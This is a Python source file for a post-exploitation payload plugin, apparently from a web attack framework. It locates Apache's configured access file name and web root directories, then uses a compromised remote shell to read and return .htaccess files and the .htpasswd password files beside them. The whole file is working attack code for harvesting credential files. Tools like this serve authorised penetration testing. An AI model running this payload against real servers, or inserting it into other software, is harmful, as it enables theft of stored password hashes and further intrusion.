import re
from plugins.attack.payloads.base_payload import base_payload

class apache_htaccess(base_payload):
    '''
    This payload shows Apache distributed configuration files (.htaccess & .htpasswd)
    '''
    def run_read(self):
        result = []

        def parse_htaccess(config_file):
            htaccess = re.search('(?<=AccessFileName )(.*)', config_file )
            if htaccess:
                return htaccess.group(1)
            else:
                return ''

        apache_config = self.exec_payload('apache_config')
        htaccess = '.htaccess'
        if apache_config:
            for line in apache_config:
                if parse_htaccess(line) != '':
                    htaccess = parse_htaccess(line)


        apache_root = self.exec_payload('apache_root_directory')
        if apache_root:
            for dir in apache_root:
                if htaccess and self.shell.read(dir+htaccess):
                    result.append('File => '+dir+htaccess)
                    result.append(self.shell.read(dir+htaccess))
                    result.append('File => '+dir+'.htpasswd')
                    result.append(self.shell.read(dir+'.htpasswd'))
        
        if result == [ ]:
            result.append('Htaccess files not found.')
        return result
